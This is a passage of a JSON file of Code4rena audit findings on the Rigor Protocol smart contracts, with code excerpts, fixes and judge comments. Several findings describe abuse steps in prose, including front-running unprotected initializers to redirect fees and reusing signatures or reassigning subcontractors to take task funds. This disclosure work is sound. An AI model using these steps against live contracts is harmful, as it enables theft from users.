}\n```\n\n[Project.sol#L477-L481](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L477-L481)<br>\n\n```solidity\n            // If new subcontractor is not zero address.\n            if (_newSC != address(0)) {\n                // Invite the new subcontractor for the task.\n                _inviteSC(_taskID, _newSC, true);\n            }\n```\n\ncheckSignatureTask() checks all the signatures:\n\n[Project.sol#L855-L861](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L855-L861)<br>\n\n```solidity\n            // When builder has not delegated rights to contractor\n            else {\n                // Check for B, SC and GC signatures\n                checkSignatureValidity(builder, _hash, _signature, 0);\n                checkSignatureValidity(contractor, _hash, _signature, 1);\n                checkSignatureValidity(_sc, _hash, _signature, 2);\n            }\n```\n\n**[zgorizzo69 (Rigor) disputed and commented](https://github.com/code-423n4/2022-08-rigor-findings/issues/378#issuecomment-1207288111):**\n > When a SC accepts an invitation the task is marked as active [Tasks.sol#L128](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/libraries/Tasks.sol#L128).<br>\n> So as you noted here above the inviteSubcontractor for the same task will fail because of the modifier.\n> \n> ```\n>     function inviteSubcontractor(Task storage _self, address _sc)\n>         internal\n>         onlyInactive(_self)\n>     {\n> ```\n\n**[hyh (warden) commented](https://github.com/code-423n4/2022-08-rigor-findings/issues/378#issuecomment-1210603649):**\n > Yes, you are right, in general case `onlyInactive` modifier guards the reset.<br>\n> The issue appears to be more specific, in the case when task budget is increased, while there is no budget to cover it, i.e. `totalLent - _totalAllocated < _newCost - _taskCost`, the subcontractor signs only the budget increase itself, while subcontractor ends up being unassigned from it fully:\n> \n> [Project.sol#L422-L461](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L422-L461)<br>\n> \n> ```solidity\n>             // If tasks are already allocated with old cost.\n>             if (tasks[_taskID].alerts[1]) {\n>                 // If new task cost is less than old task cost.\n>                 if (_newCost < _taskCost) {\n>                     // Find the difference between old - new.\n>                     uint256 _withdrawDifference = _taskCost - _newCost;\n> \n>                     // Reduce this difference from total cost allocated.\n>                     // As the same task is now allocated with lesser cost.\n>                     totalAllocated -= _withdrawDifference;\n> \n>                     // Withdraw the difference back to builder's account.\n>                     // As this additional amount may not be required by the project.\n>                     autoWithdraw(_withdrawDifference);\n>                 }\n>                 // If new cost is more than task cost but total lent is enough to cover for it.\n>                 else if (totalLent - _totalAllocated >= _newCost - _taskCost) {\n>                     // Increase the difference of new cost and old cost to total allocated.\n>                     totalAllocated += _newCost - _taskCost;\n>                 }\n>                 // If new cost is more than task cost and totalLent is not enough.\n>                 else {\n>                     // Un-confirm SC, mark task as inactive, mark allocated as false, mark lifecycle as None\n> \n>                     // Mark task as inactive by unapproving subcontractor.\n>                     // As subcontractor can only be approved if task is allocated\n>                     _unapproved = true;\n>                     tasks[_taskID].unApprove();\n> \n>                     // Mark task as not allocated.\n>                     tasks[_taskID].unAllocateFunds();\n> \n>                     // Reduce total allocation by old task cost.\n>                     // As as needs to go though funding process again.\n>                     totalAllocated -= _taskCost;\n> \n>                     // Add this task to _changeOrderedTask array. These tasks will be allocated first.\n>                     _changeOrderedTask.push(_taskID);\n>                 }\n>             }\n> ```\n> \n> Suppose task is 95% complete, its budget is fully spent, so changeOrder() is called per mutual agreement to add extra `0.05 * old_cost / 0.95` funds, which aren't lent yet. Dishonest contractor can call `inviteSC` with own subcontractor, who will receive full `old_cost / 0.95` on completion.\n> \n> I.e. fully removing subcontractor from already funded and started task provides a more specific similar attack surface.\n> \n> By definition `unApprove` deals with the case of new task that needs to be reviewed:\n> \n> [Tasks.sol#L153-L164](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/libraries/Tasks.sol#L153-L164)<br>\n> \n> ```solidity\n>     /**\n>      * @dev Set a task as un accepted/approved for SC\n> \n>      * @dev modifier onlyActive\n> \n>      * @param _self Task the task being set as funded\n>      */\n>     function unApprove(Task storage _self) internal {\n>         // State/ lifecycle //\n>         _self.alerts[uint256(Lifecycle.SCConfirmed)] = false;\n>         _self.state = TaskStatus.Inactive;\n>     }\n> ```\n> \n> But in changeOrder() all the parties already reviewed and accepted the terms:\n> \n> [Project.sol#L391-L403](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L391-L403)<br>\n> \n> ```solidity\n>         // Decode params from _data\n>         (\n>             uint256 _taskID,\n>             address _newSC,\n>             uint256 _newCost,\n>             address _project\n>         ) = abi.decode(_data, (uint256, address, uint256, address));\n> \n>         // If the sender is disputes contract, then do not check for signatures.\n>         if (_msgSender() != disputes) {\n>             // Check for required signatures.\n>             checkSignatureTask(_data, _signature, _taskID);\n>         }\n> ```\n> [Project.sol#L855-L861](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L855-L861)<br>\n> \n> ```solidity\n>             // When builder has not delegated rights to contractor\n>             else {\n>                 // Check for B, SC and GC signatures\n>                 checkSignatureValidity(builder, _hash, _signature, 0);\n>                 checkSignatureValidity(contractor, _hash, _signature, 1);\n>                 checkSignatureValidity(_sc, _hash, _signature, 2);\n>             }\n> ```\n> \n> So, marking the task as not active and not SCConfirmed doesn't look correct in this case.\n> \n> Straightforward mitigation here is to keep it active, i.e. do partial flag removal, say do `unConfirm` instead of `unApprove`:\n> \n> [Tasks.sol#L160-L164](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/libraries/Tasks.sol#L160-L164)<br>\n> \n> ```solidity\n>     function unConfirm(Task storage _self) internal {\n>         // State/ lifecycle //\n>         _self.alerts[uint256(Lifecycle.SCConfirmed)] = false;\n>     }\n> ```\n\n**[hyh (warden) commented](https://github.com/code-423n4/2022-08-rigor-findings/issues/378#issuecomment-1211350315):**\n > A little bit more complex, but more correct (project logic aligned) mitigation is:\n> \n> 1) Introduce `deActivate` instead of `unConfirm`:\n> \n> ```solidity\n>     function deActivate(Task storage _self) internal {\n>         // State/ lifecycle //\n>         _self.state = TaskStatus.Inactive;\n>     }\n> ```\n> \n> 2) Introduce `onlyUnconfirmed` modifier and set it to the inviteSubcontractor() and acceptInvitation():\n> \n> ```solidity\n>     /// @dev only allow unconfirmed tasks.\n>     modifier onlyUnconfirmed(Task storage _self) {\n>         require(\n>             !_self.alerts[uint256(Lifecycle.SCConfirmed)],\n>             \"Task::SCConfirmed\"\n>         );\n>         _;\n>     }\n> ```\n> \n> [Tasks.sol#L106-L111](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/libraries/Tasks.sol#L106-L111)<br>\n> \n> ```solidity\n>     function inviteSubcontractor(Task storage _self, address _sc)\n>         internal\n> -       onlyInactive(_self)\n> +       onlyUnconfirmed(_self)\n>     {\n>         _self.subcontractor = _sc;\n>     }\n> ```\n> \n> [Tasks.sol#L119-L129](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/libraries/Tasks.sol#L119-L129)<br>\n> \n> ```solidity\n>     function acceptInvitation(Task storage _self, address _sc)\n>         internal\n> -       onlyInactive(_self)\n> +       onlyUnconfirmed(_self)\n>     {\n>         // Prerequisites //\n>         require(_self.subcontractor == _sc, \"Task::!SC\");\n> \n>         // State/ lifecycle //\n>         _self.alerts[uint256(Lifecycle.SCConfirmed)] = true;\n>         _self.state = TaskStatus.Active;\n>     }\n> ```\n> \n> `onlyInactive` can then be removed:\n> \n> [Tasks.sol#L42-L46](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/libraries/Tasks.sol#L42-L46)<br>\n> \n> ```solidity\n>     /// @dev only allow inactive tasks. Task is inactive if SC is unconfirmed.\n>     modifier onlyInactive(Task storage _self) {\n>         require(_self.state == TaskStatus.Inactive, \"Task::active\");\n>         _;\n>     }\n> ```\n> \n> 3) Deactivate task only instead of fully resetting it in changeOrder():\n> \n> [Project.sol#L443-L460](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L443-L460)<br>\n> \n> ```solidity\n>                 else {\n> -                  // Un-confirm SC, mark task as inactive, mark allocated as false, mark lifecycle as None\n> \n> -                  // Mark task as inactive by unapproving subcontractor.\n> -                  // As subcontractor can only be approved if task is allocated\n> -                  _unapproved = true;\n> -                  tasks[_taskID].unApprove();\n> \n> +                  // Mark task as inactive, mark allocated as false, add to the allocation queue\n> \n> +                  // Mark task as inactive\n> +                  tasks[_taskID].deActivate();\n> \n>                     // Mark task as not allocated.\n>                     tasks[_taskID].unAllocateFunds();\n> \n>                     // Reduce total allocation by old task cost.\n>                     // As as needs to go though funding process again.\n>                     totalAllocated -= _taskCost;\n> \n>                     // Add this task to _changeOrderedTask array. These tasks will be allocated first.\n>                     _changeOrderedTask.push(_taskID);\n>                 }\n> ```\n> \n> \n> Notice that the mitigation here is to make Active and SCConfirmed states independent (as a general note, it doesn't make much sense to have some fully coinciding states). Active flags whether task is in progress right now, while SCConfirmed flags whether it ever was started, being either Active (work is being done right now) or Inactive (work had started, something was done, now it's paused).\n> \n> The issue basically means that the states are different and moving a task to another SC while it's SCConfirmed should be prohibited as some work was done and some payment to current SC is due\n\n**[parv3213 (Rigor) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2022-08-rigor-findings/issues/378#issuecomment-1211605980):**\n > Agree to the risk, but the severity should be 2. \n\n**[Jack the Pug (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-08-rigor-findings/issues/378#issuecomment-1229128226):**\n > This is a good one with a very detailed explanation, but I'm afraid it fits a Medium severity better, as funds are not directly at risk but rather a malfunctioning feature that can indirectly cause damage to certain roles.\n\n\n\n***\n\n",
      "summary": "\nA bug has been discovered in the code of a project located at the given link. The bug allows malicious builders/contractors to change subcontractors for any task even if all the terms have already been agreed upon and work has started/finished. This can be done by creating a subcontractor of their own and front running a valid setComplete() call with a sequence of inviteSC(task, own_subcontractor) -> setComplete() with a signatory from the own_subcontractor, stealing the task budget from the subcontractor who did the job. This bug is very serious as it creates an attack vector to fully steal task budget from the subcontractor.\n\nThe bug is caused by the absence of a getAlerts(_taskID)[2] check and checkSignatureTask() call in inviteSC(). Currently, inviteSC() only checks for a non-zero address and calls inviteSubcontractor(), which just sets the new value. The task is then paid only on completion by setComplete(), which transfers funds to the subcontractor.\n\nThe recommended mitigation steps to fix this bug involve calling checkSignatureTask() when getAlerts(_taskID)[2] is true. This approach is already implemented in changeOrder() where _newSC is a part of the hash that has to be signed by all parties. checkSignatureTask() checks all the signatures, including the builder, subcontractor, and contractor.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "https://github.com/code-423n4/2022-08-rigor-findings/issues/378",
      "tags": [],
      "finders": [
        "hyh",
        "hansfriese"
      ]
    },
    {
      "id": "3119",
      "title": "[M-15] `Project.addTasks()` wouldn't work properly when it's called from disputes contract.",
      "impact": "MEDIUM",
      "content": "_Submitted by hansfriese, also found by Lambda_\n\n[Project.sol#L238](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L238)<br>\n\n`addTasks()` function checks [this require()](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L238) to make sure `_taskCount` is correct.\n\nBut it might revert when this function is called after a dispute because it takes a certain time to resolve disputes and other tasks might be added meanwhile.\n\n### Proof of Concept\n\nThe below scenario would be possible.\n\n*   A project contains 10 active tasks(taskCount = 10) and a builder and contractor are going to add one more task.\n*   There were some disagreements between a builder and contractor so they raised a dispute with \\_taskCount = 10 using [raiseDispute()](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L493).\n*   Normally it would take a certain time(like 1 day or more) to resolve the dispute as it must be done by HomeFi owner.\n*   Meanwhile, if the builder and contractor need to add another task, they should set `_taskCount = 10` and `taskCount` will be 11 after addition [here](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L260).\n*   After that, the HomeFi admin agreed to add a task with `_taskCount = 10`, but it will revert [here](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L238).\n\nSo currently, the project builder and contractor shouldn't add new tasks to make their previous dispute valid.\n\nI think it's reasonable to modify that they can add other tasks even though there is an active dispute.\n\n### Tools Used\n\nSolidity Visual Developer of VSCode\n\n### Recommended Mitigation Steps\n\nI think we can modify not to compare [taskCount](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L238) when it's called from disputes contract.\n\nSo we can modify [this part](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L238) like below.\n\n    if (_msgSender() != disputes) {\n        require(_taskCount == taskCount, \"Project::!taskCount\");\n    }\n    else {\n        _taskCount = taskCount;\n    }\n\n**[parv3213 (Rigor) confirmed](https://github.com/code-423n4/2022-08-rigor-findings/issues/233)**\n\n\n\n***\n\n",
      "summary": "\nA bug was discovered in the `addTasks()` function of the HomeFi project. This function checks the `_taskCount` to make sure it is correct, however if the function is called after a dispute, it may revert due to the fact that it takes time to resolve disputes and other tasks may be added in the meantime.\n\nA proof of concept was provided to demonstrate the vulnerability. It involves a project with 10 active tasks, a builder and contractor attempting to add one more, and a dispute being raised with `_taskCount` set to 10. If the HomeFi admin agrees to add a task with `_taskCount` set to 10, the process will revert.\n\nThe recommended mitigation steps involve modifying the code so that `taskCount` is not compared when it is called from the disputes contract. This can be done by adding an `if` statement to the code, as shown in the report.\n\nOverall, this bug impacts the `addTasks()` function of the HomeFi project, and can be mitigated by modifying the code as recommended.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "https://github.com/code-423n4/2022-08-rigor-findings/issues/233",
      "tags": [],
      "finders": [
        "Lambda",
        "hansfriese"
      ]
    },
    {
      "id": "3118",
      "title": "[M-14] Incorrect initialization of smart contracts with Access Control issue",
      "impact": "MEDIUM",
      "content": "_Submitted by Haipls, also found by byndooa, cryptphi, and TrungOre_\n\n[HomeFiProxy.sol#L216-L230](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/HomeFiProxy.sol#L216-L230)<br>\n[Community.sol#L102-L119](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Community.sol#L102-L119)<br>\n[DebtToken.sol#L43-L58](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/DebtToken.sol#L43-L58)<br>\n[Disputes.sol#L74-L81](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Disputes.sol#L74-L81)<br>\n[HomeFi.sol#L92-L120](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/HomeFi.sol#L92-L120)<br>\n[Project.sol#L94-L105](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L94-L105)<br>\n[ProjectFactory.sol#L45-L55](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/ProjectFactory.sol#L45-L55)<br>\n\nAll next Impact depends on actions and attention from developers when deployed\n\n*   Loss of funds\n*   Failure of the protocol, with the need for redeploy\n*   Loss of control over protocol elements (some smart contracts)\n*   The possibility of replacing contracts and settings with harmful ones\n\nAnd other things that come out of it...\n\n### Proof of Concept\n\nFor a proper understanding of Proof of Concept, you need to understand the following things:\n\n1.  Hardhat does not stop the process with a deploy and does not show failed transactions if they have occurred in some cases\n2.  Malicious agents can trace the protocol deployment transactions and insert their own transaction between them\n\nReason:\n\n*   [During deploy TransparentUpgradeableProxy's](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/HomeFiProxy.sol#L216-L230) initialize method for initializing contracts not called. The third parameter responsible for this is an empty string. This causes the initialization process itself to be **delayed**\n\n*   Contract initialization methods have no check over who calls them\n\nExample [ProjectFactory.sol#L45-L55](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/ProjectFactory.sol#L45-L55)\n\n**Also suitable for other contracts, strings are attached in Links to affected code**\n\n### Examples of exploiting the vulnerability\n\n**Failure of the protocol, with the need for redeploy** && **Loss of control over protocol elements (some smart contracts)**:\n\n1.  User listen transaction in mempool, etherscan, transaction in block etc\n2.  Finds the moment of deployment and sends the transaction for setup his HomeFi address in Disputes contract: Just he call initialize method and put his \\_homeFi parameter\n3.  In the event that hardhat tracked a failed transaction, the deployment will stop and you will need to start over. If the hardhead misses it and the developers do not check the result and the setting, access to this part will be lost and fix is needed\n\n**Loss of funds**:\n\n1.  User listen transaction in mempool, etherscan, transaction in block for listne when HomeFi will deployed\n2.  Send transaction for initialize [HomeFi](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/HomeFi.sol#L92-L120) with his \\_treasury address\n3.  Transfer the admin ownership the right to the real address to divert the eyes\n4.  The address of the treasury remains with the attacker\n5.  The protocol fees (fee) will be [transfered](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Community.sol#L443) to the attacker's address until it is detected\n\n### Recommended Mitigation Steps\n\nCarry out checks at the initialization stage or redesign the deployment process with the initialization of contracts during deployment\n\n**[zgorizzo69 (Rigor) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2022-08-rigor-findings/issues/6#issuecomment-1208155944):**\n >  About the reasons\n> * TransparentUpgradeableProxy third parameter is optionally initialized with `_data` as explained in {ERC1967Proxy-constructor}\n> *  incorrect modifiers check that addresses are not address(0)<br>\n> about the possible exploit<br>\n> Interesting take on how the dark forest's creatures can harm the deployment process :+1: <br>\n> however if a tx fails the whole deployment script stops but I think it is a good practice to indeed verify after each initialization\n\n**[Jack the Pug (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-08-rigor-findings/issues/6#issuecomment-1229122338):**\n > Valid, but gonna downgrade it to Medium as the impact is not that severe in practice.\n> \n> Btw, in response to the response about the 2nd reason:\n> \n> > Contract initialization methods have no check over who calls them.<br>\n> > incorrect modifiers check that addresses are not address(0)\n> \n> \"no check over who calls them\" means no access control. It can be called by anyone. It's not about the input validation.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of the 2022-08-rigor project on Github. The vulnerability is caused by a lack of a check for who is calling the initialization methods of certain contracts. This can lead to a loss of funds, failure of the protocol, loss of control over protocol elements, and the possibility of malicious agents replacing contracts and settings.\n\nThe code in question can be found in the following files: HomeFiProxy.sol, Community.sol, DebtToken.sol, Disputes.sol, HomeFi.sol, Project.sol, and ProjectFactory.sol.\n\nThe vulnerability can be exploited by malicious agents in two ways. First, they can trace the protocol deployment transactions and insert their own transaction between them. Second, they can call the initialization methods and put their own address as the parameter. This can lead to a failure of the protocol or a loss of funds.\n\nThe recommended mitigation steps are to carry out checks at the initialization stage or redesign the deployment process with the initialization of contracts during deployment.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "https://github.com/code-423n4/2022-08-rigor-findings/issues/6",
      "tags": [],
      "finders": [
        "TrungOre",
        "cryptphi",
        "byndooa",
        "Haipls"
      ]
    },
    {
      "id": "3117",
      "title": "[M-13] In `Project.setComplete()`, the signature can be reused when the first call is reverted for some reason",
      "impact": "MEDIUM",
      "content": "_Submitted by hansfriese, also found by cccz_\n\n[Project.sol#L330](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L330)<br>\n\n`setComplete()` function might be called successfully using the past signature when it shouldn't work.\n\nAs a result, a task might be completed when a builder doesn't want it.\n\n### Proof of Concept\n\n[approveHash() function](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L108) can set only true so there is no method to cancel already approved hash without [passing validation here](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L891).\n\nSo the below scenario would be possible.\n\n*   A builder, GC, and SC started a task and SC finished the task.\n*   They are approved to complete the task and signed the signature.\n*   But right before to call [setComplete()](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L330) using the signature, the SC felt the cost is too low and raised a dispute to change the order using [raiseDispute()](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L493).\n*   As I suggested with another medium issue, the task can't be completed when there is an ongoing dispute from [this document - \"If there is no ongoing dispute about that project, task status is updated and payment is made.\"](https://github.com/code-423n4/2022-08-rigor#tasks-completion-and-payment). So `setComplete()` might revert.\n*   Even if it doesn't check active disputes as now, `setComplete()` might revert when the funds haven't been allocated and a builder signed by fault.\n*   After that, the HomeFi admin accepted the dispute, and the cost of the task was increased as SC wanted.\n*   Then the builder would hope to get more results (or scores) from this task as the cost is increased rather than completed right away.\n*   But SC can call `setComplete()` using the previous signature and complete the task without additional work.\n*   A builder might know about that before and try to update task hash but it will revert because SC doesn't agree to [updateTaskHash()](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L283).\n*   In this case, it's logical to cancel the approved hash [here](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L108) but there is no such option.\n\nI don't know if there would be similar problems with other functions that use signature and I think it would reduce the risk a little if we add an option to cancel the approved hash.\n\n### Tools Used\n\nSolidity Visual Developer of VSCode\n\n### Recommended Mitigation Steps\n\nRecommend modifying [approveHash()](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L108) like below.\n\n    function approveHash(bytes32 _hash, bool _bool) external override { //++++++++++++++++++++\n        address _sender = _msgSender();\n        // Allowing anyone to sign, as its hard to add restrictions here.\n        // Store _hash as signed for sender.\n        approvedHashes[_sender][_hash] = _bool; //+++++++++++++++++++\n\n        emit ApproveHash(_hash, _sender, _bool); //++++++++++++++++++++++\n    }\n\nI am not so sure that a similar scenario would be possible in the [Community contract](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Community.sol#L501) also and recommend to change both functions together.\n\n**[parv3213 (Rigor) confirmed](https://github.com/code-423n4/2022-08-rigor-findings/issues/263)**\n\n\n\n***\n\n",
      "summary": "\nA bug was discovered in the code-423n4/2022-08-rigor repository. The `setComplete()` function might be called successfully using a past signature when it shouldn't work. As a result, a task might be completed when a builder doesn't want it. This is due to the fact that the `approveHash()` function can only set to true, and there is no method to cancel an already approved hash without passing validation. \n\nThe proof of concept is that a builder, GC, and SC started a task and SC finished the task. They are approved to complete the task and signed the signature. However, right before calling `setComplete()` using the signature, the SC felt the cost was too low and raised a dispute to change the order using `raiseDispute()`. As the task cannot be completed when there is an ongoing dispute, `setComplete()` might revert. Even if it doesn't check active disputes, `setComplete()` might revert when the funds haven't been allocated and a builder signed by fault. \n\nThe HomeFi admin accepted the dispute, and the cost of the task was increased as SC wanted. This means the builder would hope to get more results from the task as the cost is increased, but SC can call `setComplete()` using the previous signature and complete the task without additional work. A builder might know about this and try to update the task hash, but it will revert because SC doesn't agree to `updateTaskHash()`.\n\nThe recommended mitigation steps are to modify `approveHash()` to include a way to cancel the approved hash and to change both functions together in the Community contract. Solidity Visual Developer of VSCode was used to identify the bug.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "https://github.com/code-423n4/2022-08-rigor-findings/issues/263",
      "tags": [],
      "finders": [
        "cccz",
        "hansfriese"
      ]
    },
    {
      "id": "3116",
      "title": "[M-12] `updateProjectHash` does not check project address",
      "impact": "MEDIUM",
      "content": "_Submitted by MEP, also found by byndooa, Haipls, and minhquanym_\n\n[Project.sol#L162](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L162)<br>\n\nIn Project.sol, function `updateProjectHash` L162, `_data` (which is signed by builder and/or contractor) does not contain a reference to the project address. In all other external functions of Project.sol, `_data` contains the address of the project, used in this check:<br>\n`require(_projectAddress == address(this), \"Project::!projectAddress\");`.<br>\n\nThe lack of this verification makes it possible to reuse the same `_data`, and the same `_signature` on another project, in the case the latter has the same builder and/or contractor, and the same `_nonce`. In pratice, if the same group of people starts a new project, when `_nonce` reaches the correct value, anyone can change the hash of a task (if we suppose that that `updateTaskHash()` was used in the previous project).\n\n**[parv3213 (Rigor) confirmed](https://github.com/code-423n4/2022-08-rigor-findings/issues/347)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Project.sol contract. The vulnerability is in the function updateProjectHash, which is used to update the project's hash. The problem is that the data signed by the builder and/or contractor does not contain a reference to the project address. Without this verification, it is possible to reuse the same data and signature on another project if it has the same builder and/or contractor and the same nonce. This could allow someone to change the hash of a task in the previous project if the nonce reaches the correct value.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "https://github.com/code-423n4/2022-08-rigor-findings/issues/347",
      "tags": [],
      "finders": [
        "minhquanym",
        "byndooa",
        "MEP",
        "Haipls"
      ]
    },
    {
      "id": "3115",
      "title": "[M-11] Owner of project NFT has no purpose",
      "impact": "MEDIUM",
      "content": "_Submitted by berndartmueller, also found by byndooa and rbserver_\n\nCreating a new project mints a NFT to the `_sender` (builder). The `builder` of a project has special permissions and is required to perform various tasks.\n\nHowever, if the minted NFT is transferred to a different address, the `builder` of a project stays the same and the new owner of the transferred NFT has no purpose and no permissions to access authorized functions in Rigor.\n\nIf real-world use-cases require a change of the `builder` address, there is currently no way to do so. Funds could be locked in the project contract if the current `builder` address is unable to perform any more actions.\n\n### Proof of Concept\n\n[HomeFi.sol#L225](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/HomeFi.sol#L225)<br>\n\n```solidity\nfunction createProject(bytes memory _hash, address _currency)\n    external\n    override\n    nonReentrant\n{\n    // Revert if currency not supported by HomeFi\n    validCurrency(_currency);\n\n    address _sender = _msgSender();\n\n    // Create a new project Clone and mint a new NFT for it\n    address _project = projectFactoryInstance.createProject(\n        _currency,\n        _sender\n    );\n    mintNFT(_sender, string(_hash));\n\n    // Update project related mappings\n    projects[projectCount] = _project;\n    projectTokenId[_project] = projectCount;\n\n    emit ProjectAdded(projectCount, _project, _sender, _currency, _hash);\n}\n```\n\n### Recommended Mitigation Steps\n\nConsider preventing transferring the project NFT to a different address for now as long as there is no use-case for the NFT owner/holder or use the actual NFT owner as the `builder` of a project.\n\n**[zgorizzo69 (Rigor) disputed and commented](https://github.com/code-423n4/2022-08-rigor-findings/issues/413#issuecomment-1207294173):**\n > Builders are kyc'ed that's why just by transferring the NFT you don't get any of the builder privileges. \n\n**[parv3213 (Rigor) commented](https://github.com/code-423n4/2022-08-rigor-findings/issues/413#issuecomment-1207340273):**\n > As the warden said, `Owner of project NFT has no purpose` is true and is the intended behavior. Owning this NFT does not change anything.\n\n**[Jack the Pug (judge) confirmed as valid](https://github.com/code-423n4/2022-08-rigor-findings/issues/413)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the project NFT (non-fungible token) in Rigor, a blockchain-based platform. When creating a new project, a NFT is minted to the sender (builder). The builder has special permissions to access authorized functions in Rigor. However, if the NFT is transferred to a different address, the builder stays the same and the new owner has no purpose and no permissions. This means funds could be locked in the project contract if the current builder address is unable to perform any more actions. The bug was identified through manual review. To mitigate this issue, it is recommended to prevent transferring the project NFT to a different address or use the actual NFT owner as the builder of a project.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "https://github.com/code-423n4/2022-08-rigor-findings/issues/413",
      "tags": [],
      "finders": [
        "byndooa  rbserver",
        "berndartmueller"
      ]
    },
    {
      "id": "3114",
      "title": "[M-10] Possible DOS in `lendToProject()` and `toggleLendingNeeded()` function because unbounded loop can run out of gas",
      "impact": "MEDIUM",
